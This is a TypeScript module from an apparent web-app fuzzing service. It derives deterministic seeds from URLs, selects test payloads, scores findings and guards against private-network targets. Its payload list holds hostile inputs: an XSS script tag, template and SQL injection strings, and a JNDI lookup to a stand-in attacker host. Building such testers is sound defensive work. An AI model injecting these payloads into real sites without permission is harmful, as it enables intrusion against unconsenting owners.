// deterministic.ts — BreakMyApp determinism core.
// Pure, dependency-free (works in mutations, actions, and the browser).
//
// seed = uint32(sha256(normalizedUrl)). Same URL => same seed forever.
// The suite (deterministic-suite@1.0) is a fixed, versioned artifact: same seed
// + same suite => identical findings, identical order, identical payloads.

export const SUITE_VERSION = "deterministic-suite@1.1";

// Temporary testing toggle: set to false to re-enable the Whop paywalls.
export const PAYWALLS_DISABLED = false;

export const VIEWPORT_MATRIX = [
  { name: "desktop", width: 1440, height: 900 },
  { name: "mobile", width: 390, height: 844 },
] as const;

// Fixed payload pack — versioned constant array injected into every detected
// <input>/<button> in fixed DOM order. Payload selection and click order are
// PRNG-driven from runSeed, which makes them reproducible.
export const PAYLOAD_PACK: string[] = [
  '"><script>alert(1)</script>',
  "{{7*7}}",
  "${jndi:ldap://evil.example}",
  "A".repeat(500),
  "🚀🦀🔥" .repeat(12),
  "' OR 1=1;--",
  "%00",
  "\x09\x0a\x00",
  "null",
  "undefined",
  "-1",
  "0x7FFFFFFF",
  "N".repeat(50),
];

// ---- Sync SHA-256 (pure TS, no WebCrypto needed in mutations) --------------

const K = new Uint32Array([
  0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b, 0x59f111f1,
  0x923f82a4, 0xab1c5ed5, 0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3,
  0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174, 0xe49b69c1, 0xefbe4786,
  0x0fc19dc6, 0x240ca1cc, 0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,
  0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7, 0xc6e00bf3, 0xd5a79147,
  0x06ca6351, 0x14292967, 0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13,
  0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85, 0xa2bfe8a1, 0xa81a664b,
  0xc24b8b70, 0xc76c51a3, 0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,
  0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a,
  0x5b9cca4f, 0x682e6ff3, 0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208,
  0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2,
]);

function rotr(x: number, n: number) {
  return ((x >>> n) | (x << (32 - n))) >>> 0;
}

/** Pure-TS synchronous SHA-256, hex output. */
export function sha256Hex(input: string): string {
  const data = new TextEncoder().encode(input);
  const bitLen = data.length * 8;
  const padded = new Uint8Array(Math.ceil((data.length + 9) / 64) * 64);
  padded.set(data);
  padded[data.length] = 0x80;
  const dv = new DataView(padded.buffer);
  dv.setUint32(padded.length - 8, Math.floor(bitLen / 0x100000000), false);
  dv.setUint32(padded.length - 4, bitLen >>> 0, false);

  let h0 = 0x6a09e667, h1 = 0xbb67ae85, h2 = 0x3c6ef372, h3 = 0xa54ff53a;
  let h4 = 0x510e527f, h5 = 0x9b05688c, h6 = 0x1f83d9ab, h7 = 0x5be0cd19;
  const w = new Uint32Array(64);

  for (let off = 0; off < padded.length; off += 64) {
    for (let i = 0; i < 16; i++) w[i] = dv.getUint32(off + i * 4, false);
    for (let i = 16; i < 64; i++) {
      const s0 = rotr(w[i - 15], 7) ^ rotr(w[i - 15], 18) ^ (w[i - 15] >>> 3);
      const s1 = rotr(w[i - 2], 17) ^ rotr(w[i - 2], 19) ^ (w[i - 2] >>> 10);
      w[i] = (w[i - 16] + s0 + w[i - 7] + s1) >>> 0;
    }
    let a = h0, b = h1, c = h2, d = h3, e = h4, f = h5, g = h6, h = h7;
    for (let i = 0; i < 64; i++) {
      const S1 = rotr(e, 6) ^ rotr(e, 11) ^ rotr(e, 25);
      const ch = (e & f) ^ (~e & g);
      const t1 = (h + S1 + ch + K[i] + w[i]) >>> 0;
      const S0 = rotr(a, 2) ^ rotr(a, 13) ^ rotr(a, 22);
      const maj = (a & b) ^ (a & c) ^ (b & c);
      const t2 = (S0 + maj) >>> 0;
      h = g; g = f; f = e; e = (d + t1) >>> 0;
      d = c; c = b; b = a; a = (t1 + t2) >>> 0;
    }
    h0 = (h0 + a) >>> 0; h1 = (h1 + b) >>> 0; h2 = (h2 + c) >>> 0;
    h3 = (h3 + d) >>> 0; h4 = (h4 + e) >>> 0; h5 = (h5 + f) >>> 0;
    h6 = (h6 + g) >>> 0; h7 = (h7 + h) >>> 0;
  }
  return [h0, h1, h2, h3, h4, h5, h6, h7]
    .map((x) => x.toString(16).padStart(8, "0"))
    .join("");
}

// ---- URL normalization & seed derivation -----------------------------------

/** Normalize a pasted URL into a canonical key: lowercase host, strip trailing
 *  slash, strip common tracking params, drop hash, force https. */
export function normalizeUrl(raw: string): string {
  let s = raw.trim();
  if (!s) return "";
  if (/^[a-z][a-z0-9+.-]*:/i.test(s) && !/^https?:\/\//i.test(s)) return "";
  if (!/^https?:\/\//i.test(s)) s = "https://" + s;
  try {
    const u = new URL(s);
    if (u.username || u.password) return "";
    u.protocol = "https:";
    u.hash = "";
    const drop = new Set(["utm_source", "utm_medium", "utm_campaign", "utm_term", "utm_content", "fbclid", "gclid", "ref"]);
    const params = new URLSearchParams(u.searchParams);
    // URLSearchParams is not declared iterable in the DOM lib — collect keys
    // via forEach, then delete them afterwards.
    const toDrop: string[] = [];
    params.forEach((_value, key) => {
      if (drop.has(key)) toDrop.push(key);
    });
    for (const k of toDrop) params.delete(k);
    u.search = params.toString() ? params.toString() : "";
    let out = u.toString().replace(/\/$/, "");
    if (out.endsWith("?")) out = out.slice(0, -1);
    return out;
  } catch {
    return "";
  }
}

/** Shared guard for user input, discovery results, and outbound audit requests. */
export function isPublicWebUrl(raw: string): boolean {
  try {
    const u = new URL(raw);
    const h = u.hostname.toLowerCase().replace(/\.$/, "");
    if (!/^https?:$/.test(u.protocol) || u.username || u.password) return false;
    if (!h.includes(".") || h.includes(":")) return false;
    if (/(^|\.)(localhost|local|internal|test|invalid)$/.test(h)) return false;
    if (/^\d+\.\d+\.\d+\.\d+$/.test(h)) {
      const [a, b] = h.split(".").map(Number);
      if (a === 0 || a === 10 || a === 127 || a >= 224 ||
          (a === 100 && b >= 64 && b <= 127) ||
          (a === 169 && b === 254) || (a === 172 && b >= 16 && b <= 31) ||
          (a === 192 && (b === 0 || b === 168)) || (a === 198 && (b === 18 || b === 19))) return false;
    }
    return true;
  } catch { return false; }
}

/** uint32 seed derived from the normalized URL — stable across runs. */
export function seedForUrl(normalized: string): number {
  return parseInt(sha256Hex(normalized).slice(0, 8), 16) >>> 0;
}

export function hexSeed(seed: number): string {
  return "0x" + seed.toString(16).padStart(8, "0");
}

// ---- Seeded PRNG (mulberry32) -----------------------------------------------

/** Deterministic PRNG; mulberry32 is tiny, fast, and well-distributed. */
export function rng(seed: number): () => number {
  let a = seed >>> 0;
  return () => {
    a |= 0; a = (a + 0x6d2b79f5) | 0;
    let t = Math.imul(a ^ (a >>> 15), 1 | a);
    t = (t + Math.imul(t ^ (t >>> 7), 61 | t)) ^ t;
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  };
}

/** Deterministic payload selection for element at index `i`. */
export function payloadFor(seed: number, elementIndex: number): string {
  const r = rng((seed ^ (elementIndex * 0x9e3779b9)) >>> 0);
  return PAYLOAD_PACK[Math.floor(r() * PAYLOAD_PACK.length)];
}

/** Deterministic scroll depth / wait variation, bounded for the settle window. */
export function jitterFor(seed: number, stepIndex: number): number {
  const r = rng((seed ^ (stepIndex * 0x85ebca6b)) >>> 0);
  return 250 + Math.floor(r() * 500); // 250–750ms bounded settle jitter
}

// ---- Canonical findings hash ------------------------------------------------

/** Stable JSON stringify: sorted keys, whitespace-free. */
export function canonicalJson(value: unknown): string {
  if (value === null || typeof value !== "object") return JSON.stringify(value ?? null);
  if (Array.isArray(value)) return "[" + value.map(canonicalJson).join(",") + "]";
  const obj = value as Record<string, unknown>;
  const keys = Object.keys(obj).filter((k) => k !== "screenshotStorageId" && k !== "_id").sort();
  return "{" + keys.map((k) => JSON.stringify(k) + ":" + canonicalJson(obj[k])).join(",") + "}";
}

/** determinismHash = sha256(canonicalFindingsJson). */
export function determinismHash(findings: unknown): string {
  return sha256Hex(canonicalJson(findings));
}

// ---- Health scoring ----------------------------------------------------------

const SEVERITY_WEIGHT: Record<string, number> = {
  CRITICAL: 25,
  HIGH: 10,
  MEDIUM: 4,
};

/** Deterministic 0–100 health score from severities. */
export function computeHealthScore(severities: string[]): number {
  let deduction = 0;
  for (const s of severities) deduction += SEVERITY_WEIGHT[s] ?? 6;
  return Math.max(0, 100 - deduction);
}

/** Whop fee approximation for treasury math (Whop Payments). */
export function whopFeeCents(grossCents: number): number {
  return Math.round(grossCents * 0.03 + 30); // ~3% + 30¢
}

export function projectNameFromUrl(normalized: string): string {
  try {
    const u = new URL(normalized);
    const host = u.hostname.replace(/^www\./, "").split(".")[0] || normalized;
    return host.charAt(0).toUpperCase() + host.slice(1);
  } catch {
    return normalized.slice(0, 40) || "Unknown Target";
  }
}
